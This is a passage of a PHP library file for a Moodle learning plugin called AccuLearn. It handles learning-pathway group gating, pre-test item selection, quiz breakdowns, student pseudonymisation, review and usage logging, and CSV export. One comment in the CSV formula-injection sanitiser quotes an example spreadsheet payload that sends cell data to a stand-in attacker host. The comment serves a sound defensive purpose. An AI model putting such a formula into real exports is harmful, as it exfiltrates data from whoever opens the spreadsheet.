<?php
defined('MOODLE_INTERNAL') || die();

/** Name of the per-course Moodle group used to broaden AccuLearn's LP gate
 *  beyond quiz attempts: any activity in a competency's course can use
 *  Moodle's native "Restrict access -> Group" condition against this group,
 *  and membership is kept in sync with the same gating_enabled/LP decision
 *  quizaccess_acculearn's rule.php already uses to block quiz attempts. */
define('LOCAL_ACCULEARNFEEDBACK_UNLOCK_GROUP', 'AccuLearn Unlocked');

/** Question-bank names, in paper order, of the ten items used on the pre-test
 *  in every competency. These are the BANK's names, which is why they run 1-5
 *  then 11-15; the entry screen renumbers them 1-10 for the person
 *  transcribing. Change this list (and nothing else) if a future pre-test uses
 *  a different set of items - see local_acculearnfeedback_pretest_items(). */
define('LOCAL_ACCULEARNFEEDBACK_PRETEST_ITEMS', [
    'Question 1', 'Question 2', 'Question 3', 'Question 4', 'Question 5',
    'Question 11', 'Question 12', 'Question 13', 'Question 14', 'Question 15',
]);

/**
 * Finds (or creates) the per-course "unlocked" group used for broader
 * module-visibility gating. Idempotent - safe to call on every sync.
 *
 * @param int $courseid
 * @return int group id
 */
function local_acculearnfeedback_ensure_unlock_group($courseid) {
    global $DB, $CFG;

    $existing = $DB->get_record('groups', [
        'courseid' => $courseid,
        'name' => LOCAL_ACCULEARNFEEDBACK_UNLOCK_GROUP,
    ]);
    if ($existing) {
        return $existing->id;
    }

    require_once($CFG->dirroot . '/group/lib.php');
    $data = new stdClass();
    $data->courseid = $courseid;
    $data->name = LOCAL_ACCULEARNFEEDBACK_UNLOCK_GROUP;
    $data->description = 'Maintained automatically by AccuLearn. Members are students whose '
        . 'current Learning Pathway does not block this competency. Use "Restrict access -> '
        . 'Group -> ' . LOCAL_ACCULEARNFEEDBACK_UNLOCK_GROUP . '" on any activity to gate its '
        . 'visibility on real mastery data, the same way quiz attempts are already gated.';
    $data->descriptionformat = FORMAT_PLAIN;
    return groups_create_group($data);
}

/**
 * Keeps a single user's membership across all per-competency "unlocked"
 * groups in sync with the real LP/gating_enabled decision - the same
 * source of truth quizaccess_acculearn's rule.php uses to block quiz
 * attempts. Lets teachers use Moodle's native "Restrict access -> Group" on
 * ANY activity (not just quizzes) to gate visibility on real mastery data,
 * without a bespoke availability plugin.
 *
 * Silently skips competencies with no courseid mapping, or courses the user
 * isn't enrolled in (groups_add_member() already refuses those, but
 * checking first avoids a pointless MasteryEngine call).
 *
 * @param int $userid
 */
function local_acculearnfeedback_sync_unlock_groups_for_user($userid) {
    global $DB, $CFG;

    $backendpath = '/var/www/html/acculearn-backend/mastery_engine.php';
    if (!file_exists($backendpath)) {
        return; // Backend unavailable; leave existing group membership as-is.
    }
    require_once($backendpath);
    require_once($CFG->dirroot . '/group/lib.php');

    $engine = new MasteryEngine();
    $competencies = $DB->get_records_sql(
        "SELECT * FROM acculearn_competencies WHERE courseid IS NOT NULL");

    foreach ($competencies as $c) {
        $context = context_course::instance($c->courseid);
        if (!is_enrolled($context, $userid)) {
            continue;
        }

        // Mirror quizaccess_acculearn/rule.php exactly: teachers/managers are
        // never gated, so they must never end up excluded from the unlock
        // group either - their own LP (if it computes at all) isn't a
        // meaningful signal, since they aren't the student going through
        // the mastery journey.
        if (has_capability('mod/quiz:manage', $context, $userid)) {
            $unlocked = true;
        } else if ($c->gating_enabled) {
            $result = $engine->computeLearningPathway($userid, $c->id, 'quiz');
            $unlocked = ($result['lp'] !== 1);
        } else {
            $unlocked = true;
        }

        $groupid = local_acculearnfeedback_ensure_unlock_group($c->courseid);
        $ismember = groups_is_member($groupid, $userid);

        if ($unlocked && !$ismember) {
            groups_add_member($groupid, $userid);
        } else if (!$unlocked && $ismember) {
            groups_remove_member($groupid, $userid);
        }
    }
}

/**
 * Full resync across every user enrolled in any mapped competency's course.
 * Safety net for anything that bypasses the immediate per-user sync (a
 * teacher's grade override doesn't change mastery so doesn't need one; but
 * editing gating_enabled/prerequisite_id/courseid via admin_sequence.php,
 * or the scheduled task below, do).
 */
function local_acculearnfeedback_sync_all_unlock_groups() {
    global $DB;

    $competencies = $DB->get_records_sql(
        "SELECT * FROM acculearn_competencies WHERE courseid IS NOT NULL");

    $userids = [];
    foreach ($competencies as $c) {
        $context = context_course::instance($c->courseid);
        $enrolled = get_enrolled_users($context, '', 0, 'u.id');
        foreach ($enrolled as $u) {
            $userids[$u->id] = true;
        }
    }

    foreach (array_keys($userids) as $userid) {
        local_acculearnfeedback_sync_unlock_groups_for_user($userid);
    }

    return count($userids);
}

/**
 * Recomputes a student's competency rows live, straight from the gradebook.
 *
 * The learning track is stored as a JSON snapshot, and that snapshot is only
 * rewritten when its evidence signature changes (see TrackEngine). Everything
 * in it that is FACT rather than AI prose - the per-quiz pass checklist, the
 * mastery percentages, which competency is next - can therefore be older than
 * the gradebook it describes. That is not a hypothetical: a quiz regraded
 * outside a submission, or a formative passed without moving a mastery band,
 * both leave the snapshot behind, and the student is shown "not taken" beside
 * a quiz they have sat and passed.
 *
 * So the pages recompute the deterministic half at render time and keep only
 * the narrative from storage. The computation is the same MasteryEngine call
 * the quiz access rule already makes on every quiz page view, so this is a
 * cost the site is already paying elsewhere.
 *
 * @param int $userid
 * @param string $source 'quiz' or 'pretest' - MUST match the source the stored
 *   track was built from, since a pretest-sourced track reads a different
 *   evidence table entirely.
 * @return array|null competency rows in the same shape as the stored track's
 *   'competencies', or null if the backend is unavailable (caller should then
 *   fall back to the stored snapshot rather than showing nothing).
 */
function local_acculearnfeedback_live_competencies($userid, $source = 'quiz') {
    $backendpath = '/var/www/html/acculearn-backend/mastery_engine.php';
    if (!file_exists($backendpath)) {
        return null;
    }

    try {
        require_once($backendpath);
        $engine = new MasteryEngine();
        $live = $engine->computeFullTrack($userid, $source);
        return empty($live) ? null : $live;
    } catch (\Throwable $e) {
        // A backend/database problem must not take down the student's page -
        // the stored snapshot is still worth showing.
        debugging('AccuLearn live track recompute failed: ' . $e->getMessage(), DEBUG_DEVELOPER);
        return null;
    }
}

/**
 * Maps competency id => the Moodle course it is taught in, for the CURRENT
 * user, skipping any course they cannot actually open.
 *
 * Each AccuLearn competency is its own Moodle course, so the competency name
 * on the learning track is the natural way back to the lessons and quizzes -
 * but only when the link goes somewhere the student can go. can_access_course()
 * covers hidden courses and missing enrolments, so an un-enrolled student gets
 * plain text instead of a link into an enrolment error.
 *
 * Note this is NOT gated on the AccuLearn learning pathway. LP gates quiz
 * ATTEMPTS (quizaccess_acculearn) and group-restricted activities, not reading
 * the course - a student is meant to be able to look ahead at what is coming.
 *
 * @return stdClass[] keyed by competency id, each {courseid, fullname, url}
 */
function local_acculearnfeedback_competency_courses() {
    global $DB;

    $comps = $DB->get_records_sql(
        "SELECT id, courseid FROM acculearn_competencies WHERE courseid IS NOT NULL");
    if (!$comps) {
        return [];
    }

    $courseids = array_unique(array_map(function($c) {
        return (int) $c->courseid;
    }, $comps));
    $courses = $DB->get_records_list('course', 'id', $courseids);

    $map = [];
    foreach ($comps as $c) {
        $course = $courses[$c->courseid] ?? null;
        if (!$course || !can_access_course($course)) {
            continue;
        }
        $entry = new stdClass();
        $entry->courseid = (int) $course->id;
        $entry->fullname = format_string($course->fullname, true,
            ['context' => context_course::instance($course->id)]);
        $entry->url = new moodle_url('/course/view.php', ['id' => $course->id]);
        $map[(int) $c->id] = $entry;
    }
    return $map;
}

/**
 * The two paper assessment phases, and where each one's responses live.
 *
 * The pre- and post-test use the SAME ten items per competency, so the only
 * thing that differs is the table written to - which is exactly the detail
 * that is easy to get wrong here, because the two tables follow opposite
 * naming conventions:
 *
 *   pre  -> acculearn_pretest_responses     legacy, created outside Moodle's
 *                                           schema management, so it has NO
 *                                           mdl_ prefix and is queried by its
 *                                           literal name
 *   post -> {acculearn_posttest_responses}  created the normal Moodle way, so
 *                                           it DOES carry the site prefix and
 *                                           needs the {braces} placeholder
 *
 * Getting that backwards produces a "table doesn't exist" write failure, which
 * has already happened once on this site with acculearn_usage_log. Both forms
 * live here and nowhere else so no caller has to remember which is which - the
 * 'table' value is always safe to interpolate straight into raw SQL.
 *
 * @return stdClass[] keyed by phase key ('pre'|'post')
 */
function local_acculearnfeedback_test_phases() {
    static $phases = null;
    if ($phases !== null) {
        return $phases;
    }

    $pre = new stdClass();
    $pre->key = 'pre';
    $pre->label = 'Pre-test';
    $pre->table = 'acculearn_pretest_responses';
    $pre->logaction = 'pretest_entered';
    $pre->blurb = 'Baseline, sat before instruction. This is what the student\'s initial '
        . 'learning track is computed from.';

    $post = new stdClass();
    $post->key = 'post';
    $post->label = 'Post-test';
    $post->table = '{acculearn_posttest_responses}';
    $post->logaction = 'posttest_entered';
    $post->blurb = 'Sat after instruction, using the same ten items as the pre-test so the two '
        . 'can be compared directly. Recorded for the study only - it does NOT change the '
        . 'student\'s learning track or unlock anything.';

    $phases = ['pre' => $pre, 'post' => $post];
    return $phases;
}

/**
 * One phase by key, falling back to the pre-test for anything unrecognised.
 *
 * @param string $key
 * @return stdClass
 */
function local_acculearnfeedback_test_phase($key) {
    $phases = local_acculearnfeedback_test_phases();
    return $phases[$key] ?? $phases['pre'];
}

/**
 * The items that were actually on the paper pre-test, in paper order.
 *
 * The pre-test used ten items per competency - numbered 1-5 and 11-15 on the
 * paper - but acculearn_question_competency maps the ENTIRE question bank to
 * each competency: 80 to 140 rows, because the bank holds several duplicate
 * copies of the same 40 questions (competency 7 has six copies of each). The
 * entry screen listed all of them and asked staff to fill in only the ten they
 * recognised, which is a 100-row table to transcribe ten answers into.
 *
 * Two filters produce the real paper:
 *  - name is one of the ten used (LOCAL_ACCULEARNFEEDBACK_PRETEST_ITEMS), and
 *  - where several copies share a name, the lowest question id wins.
 *
 * That the lowest-id copy is the right one is not an assumption: the question
 * ids already recorded in acculearn_pretest_responses for all 15 students match
 * this set EXACTLY in competencies 3-7, and match it in 1-2 apart from a
 * handful of stray rows belonging only to the teststudent QA account. So
 * existing entries still line up with the row they were saved against and stay
 * editable.
 *
 * Falls back to the full mapped list if the names ever stop matching (a future
 * pre-test using different items), so this can only ever tidy the page - never
 * leave it empty and unusable.
 *
 * @param int $competencyid
 * @return array question records keyed by id, in paper order
 */
function local_acculearnfeedback_pretest_items($competencyid) {
    global $DB;

    $all = $DB->get_records_sql("
        SELECT q.id, q.name, q.questiontext
          FROM {question} q
          JOIN acculearn_question_competency qc ON qc.questionid = q.id
         WHERE qc.competency_id = ?
      ORDER BY q.id", [$competencyid]);

    $wanted = array_flip(LOCAL_ACCULEARNFEEDBACK_PRETEST_ITEMS);
    $picked = [];
    $seen = [];
    foreach ($all as $q) {
        if (!isset($wanted[$q->name]) || isset($seen[$q->name])) {
            continue;   // Not a pre-test item, or a duplicate copy of one.
        }
        $seen[$q->name] = true;
        $picked[$q->id] = $q;
    }

    return $picked ?: $all;
}

/**
 * Rebuilds an attempt question by question: what was asked, what the options
 * were, which one the student picked, which was right, and how sure they were.
 *
 * Read live from Moodle's own question engine rather than from anything
 * AccuLearn stored, for two reasons. It is exact - the engine is where the
 * attempt actually lives, including the per-student shuffled option order, so
 * the page shows the paper the student really sat. And it works for EVERY
 * attempt ever made, including the 133 that were graded before this breakdown
 * existed; only the AI explanation layered on top is limited to newer
 * attempts.
 *
 * Degrades quietly for anything that is not a simple multiple-choice item:
 * the question, the response summary and the correct-answer summary still
 * render, just without the option list.
 *
 * @param stdClass $attempt a quiz_attempts record (needs ->uniqueid)
 * @return stdClass[] one row per slot: {slot, questiontext, questiontextformat,
 *   correct, partial, graded, confidence, responsesummary, rightanswer, options[]}
 */
function local_acculearnfeedback_attempt_breakdown($attempt) {
    global $CFG;
    require_once($CFG->dirroot . '/question/engine/lib.php');

    try {
        $quba = question_engine::load_questions_usage_by_activity($attempt->uniqueid);
    } catch (\Throwable $e) {
        debugging('AccuLearn could not load question usage for attempt '
            . $attempt->id . ': ' . $e->getMessage(), DEBUG_DEVELOPER);
        return [];
    }

    $rows = [];
    foreach ($quba->get_slots() as $slot) {
        $qa = $quba->get_question_attempt($slot);
        $question = $qa->get_question();

        // get_fraction() is null until graded, 1.0 for fully right. Used in
        // preference to matching on question_state subclasses, which vary by
        // behaviour - this attempt uses the custom confidence behaviour.
        $fraction = $qa->get_fraction();

        $row = new stdClass();
        $row->slot = $slot;
        $row->questiontext = $question->questiontext;
        $row->questiontextformat = $question->questiontextformat;
        $row->graded = ($fraction !== null);
        $row->correct = ($fraction !== null && $fraction >= 1.0);
        $row->partial = ($fraction !== null && $fraction > 0 && $fraction < 1.0);
        $row->confidence = $qa->get_last_qt_var('confidence');
        $row->responsesummary = $qa->get_response_summary();
        $row->rightanswer = $qa->get_right_answer_summary();
        $row->options = [];

        // Multiple choice: get_order() is the student's own shuffled order, and
        // the 'answer' variable is an index INTO that order, not an answer id -
        // reading it any other way silently marks the wrong option as chosen.
        if (method_exists($question, 'get_order') && !empty($question->answers)) {
            $order = $question->get_order($qa);
            $chosen = $qa->get_last_qt_var('answer');
            foreach ($order as $index => $answerid) {
                if (!isset($question->answers[$answerid])) {
                    continue;
                }
                $answer = $question->answers[$answerid];
                $option = new stdClass();
                $option->text = $answer->answer;
                $option->format = $answer->answerformat;
                $option->iscorrect = ((float) $answer->fraction === 1.0);
                $option->ischosen = ($chosen !== null && $chosen !== ''
                    && (int) $chosen === (int) $index);
                $row->options[] = $option;
            }
        }

        $rows[] = $row;
    }

    return $rows;
}

/**
 * Human label for the 1-3 confidence rating the student gave an answer.
 *
 * @return array [label, tone] where tone matches the al-badge--* suffixes.
 */
function local_acculearnfeedback_confidence_label($confidence) {
    switch ((int) $confidence) {
        case 1: return ['Guessed', 'neutral'];
        case 2: return ['Fairly sure', 'developing'];
        case 3: return ['Certain', 'mastered'];
        default: return [null, 'neutral'];
    }
}

/**
 * Deterministic, stable pseudonym for a user, e.g. "Student-3F9A".
 *
 * Part of the anonymization display layer: real student names must not
 * render by default on teacher-facing screens. The same userid always
 * maps to the same code, across pages and over time, and it is not
 * trivially reversible thanks to a site-specific salt. Stateless on
 * purpose (no mapping table) so it stays consistent even as the cohort
 * changes.
 *
 * @param int $userid Moodle user id
 * @return string pseudonym such as "Student-3F9A"
 */
function local_acculearnfeedback_pseudonym($userid) {
    global $CFG;
    $salt = $CFG->passwordsaltmain ?? '';
    $hash = sha1('acculearn-pseudonym:' . $salt . ':' . (int)$userid);
    return 'Student-' . strtoupper(substr($hash, 0, 4));
}

/**
 * Resolves the Moodle gradebook grade_item/grade_grade behind a single
 * acculearn_feedback row, so teacher_review.php can show/override the
 * real quiz grade rather than any AccuLearn-internal number.
 *
 * Always re-derives quiz/course/grade_item from the DB via $feedbackid
 * rather than trusting client-supplied ids, since this is also called
 * from the grade-override POST handler.
 *
 * @param int $feedbackid acculearn_feedback.id
 * @return stdClass|null {feedback, attempt, quiz, courseid, grade_item, grade_grade}
 *         or null if any link in the chain can't be resolved.
 */
/**
 * Shared per-request store behind grade_context() and its bulk preloader.
 *
 * Returned BY REFERENCE so both functions mutate the same array; a plain
 * static inside grade_context() could not be filled from the outside.
 *
 * @return array keyed by acculearn_feedback.id
 */
function &local_acculearnfeedback_grade_context_registry() {
    static $registry = [];
    return $registry;
}

/**
 * Resolves the grade context for MANY feedback rows in a fixed number of
 * queries, instead of the per-row lookups grade_context() would otherwise do.
 *
 * teacher_review.php renders a page of feedback cards and called
 * grade_context() once per card. Each call ran its own feedback + attempt +
 * quiz lookup plus a grade_item::fetch() and a grade_grade construction, so a
 * page of rows cost roughly five queries per row and grew linearly with the
 * queue - the classic N+1. This resolves the whole page up front: one query
 * for the feedback/attempt/quiz join, one for the grade items, and Moodle's
 * own grade_grade fetch per user/item pair (which needs the item anyway).
 *
 * @param int[] $feedbackids acculearn_feedback ids about to be rendered
 */
function local_acculearnfeedback_preload_grade_contexts(array $feedbackids) {
    global $DB, $CFG;

    $feedbackids = array_values(array_unique(array_filter($feedbackids)));
    if (!$feedbackids) {
        return;
    }
    require_once($CFG->libdir . '/gradelib.php');

    $registry =& local_acculearnfeedback_grade_context_registry();
    $todo = array_diff($feedbackids, array_keys($registry));
    if (!$todo) {
        return;
    }

    list($insql, $params) = $DB->get_in_or_equal(array_values($todo));
    // acculearn_feedback is one of the unprefixed legacy tables, so it is
    // named directly while the core tables keep their {braces}.
    $rows = $DB->get_records_sql("
        SELECT f.id AS feedbackid, f.*, qa.id AS attemptid_real, qa.quiz, qa.userid,
               q.course
          FROM acculearn_feedback f
          JOIN {quiz_attempts} qa ON qa.id = f.attemptid
          JOIN {quiz} q ON q.id = qa.quiz
         WHERE f.id $insql", $params);

    // One grade_item lookup per distinct quiz, not per row.
    $items = [];
    foreach ($rows as $r) {
        $items[$r->quiz] = $r->course;
    }
    $gradeitems = [];
    foreach ($items as $quizid => $courseid) {
        $gradeitems[$quizid] = grade_item::fetch([
            'itemtype' => 'mod', 'itemmodule' => 'quiz',
            'iteminstance' => $quizid, 'itemnumber' => 0, 'courseid' => $courseid,
        ]);
    }

    foreach ($rows as $r) {
        $gradeitem = $gradeitems[$r->quiz] ?? null;
        if (!$gradeitem) {
            $registry[$r->feedbackid] = null;
            continue;
        }
        $gradegrade = new grade_grade(['userid' => $r->userid, 'itemid' => $gradeitem->id], true);
        $gradegrade->grade_item =& $gradeitem;

        $attempt = new stdClass();
        $attempt->id = $r->attemptid;
        $attempt->quiz = $r->quiz;
        $attempt->userid = $r->userid;

        $quiz = new stdClass();
        $quiz->id = $r->quiz;
        $quiz->course = $r->course;

        $ctx = new stdClass();
        $ctx->feedback = $r;
        $ctx->attempt = $attempt;
        $ctx->quiz = $quiz;
        $ctx->courseid = $r->course;
        $ctx->gradeitem = $gradeitem;
        $ctx->gradegrade = $gradegrade;
        $registry[$r->feedbackid] = $ctx;
    }

    // Anything that did not resolve (deleted attempt/quiz) is cached as a miss
    // so a later call does not re-run the same failing lookup.
    foreach ($todo as $id) {
        if (!array_key_exists($id, $registry)) {
            $registry[$id] = null;
        }
    }
}

/**
 * Strips a student's real name out of AI-generated prose.
 *
 * The teacher review screen anonymises the student LABEL (Student-A4E0), but
 * the AI writes in the second person and opens with the student's first name
 * ("Hi Kristine!", "Great job, John!"). Printing that text verbatim under a
 * pseudonym de-anonymised the row in its own first sentence, which defeats the
 * whole point of the revealstudentnames capability.
 *
 * Longest match first, so "John Paul Tejada" is replaced whole rather than
 * leaving "Paul Tejada" behind after "John" is substituted. Parts shorter than
 * three characters are skipped: initials and short particles ("Jo", "de")
 * collide with ordinary words and would corrupt the prose.
 *
 * @param string|null $text the AI-generated text
 * @param stdClass $user object carrying firstname/lastname
 * @param string $pseudonym replacement label
 * @return string
 */
function local_acculearnfeedback_deidentify($text, $user, $pseudonym) {
    if ($text === null || trim((string)$text) === '') {
        return (string)$text;
    }

    $candidates = [];
    $full = trim(($user->firstname ?? '') . ' ' . ($user->lastname ?? ''));
    if ($full !== '') {
        $candidates[] = $full;
    }
    // Each individual word too: the AI usually uses the first name alone, and
    // multi-word given names ("John Paul") appear split as often as whole.
    foreach (preg_split('/\s+/', $full, -1, PREG_SPLIT_NO_EMPTY) as $part) {
        $candidates[] = $part;
    }

    $candidates = array_unique(array_filter($candidates, function($n) {
        return core_text::strlen($n) >= 3;
    }));
    usort($candidates, function($a, $b) {
        return core_text::strlen($b) - core_text::strlen($a);
    });

    foreach ($candidates as $name) {
        $text = preg_replace('/\b' . preg_quote($name, '/') . '\b/iu', $pseudonym, (string)$text);
    }
    return (string)$text;
}

/**
 * Substitutes the student placeholder in AI-generated content for a real label.
 *
 * Since September 2026 the AI is never told a student's name: it is given the
 * literal token [STUDENT] and instructed to use it wherever it would write a
 * name. Nothing identifying leaves the server, and the stored feedback and
 * track JSON hold no name either. This puts a name back at display time, and
 * the caller decides which one - the reader's own first name when a student
 * views their own feedback, or a pseudonym on the teacher review screen.
 *
 * Walks the decoded structure rather than the raw JSON, so a label containing
 * a quote or backslash cannot corrupt the document.
 *
 * Records generated before this change contain real names instead of the
 * token; those are unaffected here and are still handled on the teacher screen
 * by {@see local_acculearnfeedback_deidentify()}.
 *
 * @param mixed $data decoded JSON: string, array, or nested array
 * @param string $label what to show in place of the placeholder
 * @return mixed the same structure with placeholders replaced
 */
function local_acculearnfeedback_personalise($data, $label) {
    if (is_string($data)) {
        return str_replace(local_acculearnfeedback_student_placeholder(), $label, $data);
    }
    if (is_array($data)) {
        foreach ($data as $key => $value) {
            $data[$key] = local_acculearnfeedback_personalise($value, $label);
        }
    }
    return $data;
}

/**
 * The token the AI is given in place of a student's name.
 *
 * Mirrors FeedbackEngine::STUDENT_PLACEHOLDER in the backend. Defined here as
 * well because the plugin renders stored content without loading the backend.
 *
 * @return string
 */
function local_acculearnfeedback_student_placeholder() {
    return '[STUDENT]';
}

function local_acculearnfeedback_grade_context($feedbackid) {
    global $DB, $CFG;

    // Served from the bulk preloader when the caller is rendering a list.
    $registry =& local_acculearnfeedback_grade_context_registry();
    if (array_key_exists($feedbackid, $registry)) {
        return $registry[$feedbackid];
    }

    $feedback = $DB->get_record_sql("SELECT * FROM acculearn_feedback WHERE id = ?", [$feedbackid]);
    if (!$feedback) {
        return null;
    }

    $attempt = $DB->get_record_sql(
        "SELECT id, quiz, userid FROM {quiz_attempts} WHERE id = ?", [$feedback->attemptid]);
    if (!$attempt) {
        return null;
    }

    $quiz = $DB->get_record_sql("SELECT id, course FROM {quiz} WHERE id = ?", [$attempt->quiz]);
    if (!$quiz) {
        return null;
    }

    require_once($CFG->libdir . '/gradelib.php');
    $gradeitem = grade_item::fetch([
        'itemtype' => 'mod',
        'itemmodule' => 'quiz',
        'iteminstance' => $quiz->id,
        'itemnumber' => 0,
        'courseid' => $quiz->course,
    ]);
    if (!$gradeitem) {
        return null;
    }

    $gradegrade = new grade_grade(['userid' => $attempt->userid, 'itemid' => $gradeitem->id], true);
    $gradegrade->grade_item =& $gradeitem;

    $ctx = new stdClass();
    $ctx->feedback = $feedback;
    $ctx->attempt = $attempt;
    $ctx->quiz = $quiz;
    $ctx->courseid = $quiz->course;
    $ctx->gradeitem = $gradeitem;
    $ctx->gradegrade = $gradegrade;

    $registry[$feedbackid] = $ctx;
    return $ctx;
}

/**
 * Renders a student's Learning Pathway as a colored badge (LP1 red through
 * LP4 green), matching the numeric $c['lp'] (1-4) MasteryEngine already
 * returns alongside the human-readable lp_label - no separate lookup.
 *
 * @param int|null $lp 1-4, or null/0 if not yet computed
 * @param string $label human-readable text to show inside the badge
 * @return string HTML
 */
function local_acculearnfeedback_lp_badge($lp, $label) {
    $tone = in_array((int)$lp, [1, 2, 3, 4], true) ? 'lp' . (int)$lp : 'neutral';
    return html_writer::tag('span', s($label), ['class' => "al-badge al-badge--$tone"]);
}

/**
 * Renders a competency mastery percentage as a filled progress track, using
 * the same mastery-tone naming (mastered/developing/needs/neutral) as
 * al-card--flag-* and al-badge--*, so a card's badge, border accent, and
 * progress-bar fill always agree on color.
 *
 * @param float|null $cm competency mastery 0-100, or null if not yet attempted
 * @param string $mastery one of the MasteryEngine::classifyMastery() labels
 * @return string HTML
 */
function local_acculearnfeedback_progress_bar($cm, $mastery) {
    // 'Insufficient Evidence' must map to the SAME tone the calling pages give
    // its badge and card accent (developing). It was missing here, so it fell
    // through to 'neutral' and drew a grey bar beside an amber badge on the
    // same card - breaking the "badge, border accent and bar always agree"
    // contract this function's docblock promises.
    $tones = [
        'Mastered' => 'mastered',
        'Developing' => 'developing',
        'Insufficient Evidence' => 'developing',
        'Needs Improvement' => 'needs',
        'Not Attempted' => 'neutral',
    ];
    $tone = $tones[$mastery] ?? 'neutral';
    $width = $cm !== null ? max(0, min(100, (float)$cm)) : 0;
    return html_writer::div(
        html_writer::div('', "al-progress__bar al-progress__bar--$tone", ['style' => "width:{$width}%;"]),
        'al-progress',
        ['role' => 'progressbar', 'aria-valuenow' => $width, 'aria-valuemin' => 0, 'aria-valuemax' => 100]
    );
}

/**
 * Appends an immutable row to acculearn_review_log. Unlike the
 * reviewed/reviewed_by/reviewed_at/teacher_note/flagged columns on
 * acculearn_feedback/acculearn_learning_tracks (which only ever hold the
 * LATEST state and get overwritten on every review action), this is a
 * pure insert - it exists specifically so a later re-flag or re-approval
 * cannot erase the record of an earlier one. There is no automated
 * database backup on this server, so this is the only recovery path for
 * "what did this row look like before it was last touched."
 *
 * @param string $entitytype 'feedback' or 'track'
 * @param int $entityid acculearn_feedback.id or acculearn_learning_tracks.id
 * @param int $targetuserid the student the reviewed item is about
 * @param int $revieweruserid the teacher performing the action
 * @param string $action 'approve', 'flag', or 'gradeoverride'
 * @param string $note optional teacher note
 */
function local_acculearnfeedback_log_review($entitytype, $entityid, $targetuserid, $revieweruserid, $action, $note = '') {
    global $DB;

    // Unlike acculearn_feedback/acculearn_learning_tracks/etc. (legacy
    // tables created outside Moodle's schema management, queried by their
    // literal unprefixed name throughout this plugin), acculearn_review_log
    // is a normal Moodle-managed table created via db/install.xml, so it
    // DOES carry the site's table prefix and must use the {tablename}
    // placeholder syntax here, not a literal name.
    $DB->execute(
        "INSERT INTO {acculearn_review_log}
            (entitytype, entityid, target_userid, reviewer_userid, action, note, timecreated)
         VALUES (?, ?, ?, ?, ?, ?, ?)",
        [$entitytype, $entityid, $targetuserid, $revieweruserid, $action, $note, time()]
    );
}

/**
 * Neutralises spreadsheet formula injection in a CSV cell (CWE-1236).
 *
 * Excel/LibreOffice/Sheets treat a cell whose text begins with =, +, -, @
 * (or a leading tab/CR, which they strip before parsing) as a FORMULA, not
 * text. Exported values here include question text, answer text and user
 * names - all authored through the web UI - so a value like
 * =HYPERLINK("http://evil/?x="&A1,"click") would execute in the researcher's
 * spreadsheet when they open an export, exfiltrating other cells. Escaping
 * happens at CSV-write time rather than on input, because the data is
 * perfectly safe as HTML (it is escaped with s() there) and only becomes
 * dangerous in a spreadsheet context.
 *
 * Prefixing with a single quote is the conventional fix: spreadsheets read
 * it as "treat the rest as literal text" and do not display it.
 *
 * @param mixed $value raw cell value
 * @return mixed sanitised value safe to hand to fputcsv()
 */
function local_acculearnfeedback_csv_cell($value) {
    if (!is_string($value) || $value === '') {
        return $value;
    }
    if (preg_match('/^[\t\r]*[=+\-@]/', $value)) {
        return "'" . $value;
    }
    return $value;
}

/**
 * Applies local_acculearnfeedback_csv_cell() across a whole row.
 *
 * @param array $row
 * @return array
 */
function local_acculearnfeedback_csv_row(array $row) {
    return array_map('local_acculearnfeedback_csv_cell', $row);
}

/**
 * Records one row of AccuLearn system usage - the research instrument
 * described in the thesis's Section 3.5.3/3.8.7 (module access frequency,
 * feedback/track views, review actions) that nothing in the codebase was
 * previously writing to. Deliberately narrow (userid/action/target/time
 * only, no free-text) since this is a research/engagement signal, not
 * another place to duplicate personal data already covered elsewhere.
 *
 * @param int $userid
 * @param string $action short action code, e.g. 'view_track', 'view_feedback', 'quiz_attempt_submitted'
 * @param string|null $targettype e.g. 'attempt', 'competency', 'feedback'
 * @param int|null $targetid
 */
/**
 * Human-readable labels for the usage-log action slugs, so reports and CSV
 * exports read as English rather than as internal identifiers.
 */
function local_acculearnfeedback_usage_action_label($action) {
    $labels = [
        'session_start'      => 'Logged in',
        'view_track'         => 'Viewed learning track',
        'view_feedback'      => 'Viewed AI feedback',
        'view_lesson'        => 'Opened lesson',
        'launch_lesson_page' => 'Opened a page inside a lesson',
        'view_quiz'          => 'Opened quiz',
        'quiz_started'       => 'Started quiz attempt',
        'quiz_submitted'     => 'Submitted quiz attempt',
        'view_course'        => 'Opened competency course',
        'feedback_generated' => 'AI feedback generated',
        'track_generated'    => 'Learning track generated',
        'pretest_entered'    => 'Pre-test results entered by staff',
        'posttest_entered'   => 'Post-test results entered by staff',
    ];
    return $labels[$action] ?? ucfirst(str_replace('_', ' ', $action));
}

/**
 * @param string|null $detail Human-readable description of WHAT was acted on,
 *   resolved at event time. Stored verbatim so the record stays accurate even
 *   if the activity is renamed or removed later.
 * @param int|null $courseid Course the event occurred in. Each competency is
 *   its own course, so this is what makes per-competency engagement reporting
 *   possible.
 */
function local_acculearnfeedback_log_usage($userid, $action, $targettype = null, $targetid = null,
        $detail = null, $courseid = null) {
    global $DB;

    // Logging must never be able to break the page it is observing. Several
    // of these calls now come from event observers that run inside a student's
    // quiz submission, so a logging failure has to degrade to a debug line
    // rather than an exception in the middle of their attempt.
    try {
        // acculearn_usage_log is also a normal Moodle-managed (prefixed) table -
        // see the note in local_acculearnfeedback_log_review() above.
        $DB->execute(
            "INSERT INTO {acculearn_usage_log}
                (userid, action, target_type, target_id, detail, courseid, timecreated)
             VALUES (?, ?, ?, ?, ?, ?, ?)",
            [$userid, $action, $targettype, $targetid,
             $detail === null ? null : (string) $detail, $courseid, time()]
        );
    } catch (\Throwable $e) {
        debugging('AccuLearn usage logging failed: ' . $e->getMessage(), DEBUG_DEVELOPER);
    }
}

/**
 * True when this user is a student who has no pre-test on record yet.
 *
 * The pre-test is administered on PAPER and transcribed into AccuLearn by
 * staff via pretest_entry.php, so a student cannot self-serve here - the
 * prompt tells them what is pending and who to speak to, rather than
 * offering a button they cannot use.
 *
 * acculearn_pretest_responses is one of the legacy UNPREFIXED tables, so it
 * is queried by its literal name (see db/install.xml for why).
 */
function local_acculearnfeedback_needs_pretest($userid) {
    global $DB;

    return !$DB->record_exists_sql(
        "SELECT 1 FROM acculearn_pretest_responses WHERE userid = ?", [$userid]);
}

/**
 * Site-wide banner prompting a student whose pre-test hasn't been entered.
 *
 * Without this the only cue was the empty state on my_track.php, which a
 * student only sees if they think to navigate there - so a student with no
 * pre-test simply saw nothing and had no idea anything was outstanding.
 * Their whole personalised path depends on that baseline existing.
 *
 * Deliberately self-clearing rather than dismissible: it disappears the
 * moment the pre-test is entered, so there is no dismissed-and-forgotten
 * state to get stuck in.
 */
function local_acculearnfeedback_pretest_notice() {
    global $CFG, $USER, $PAGE;

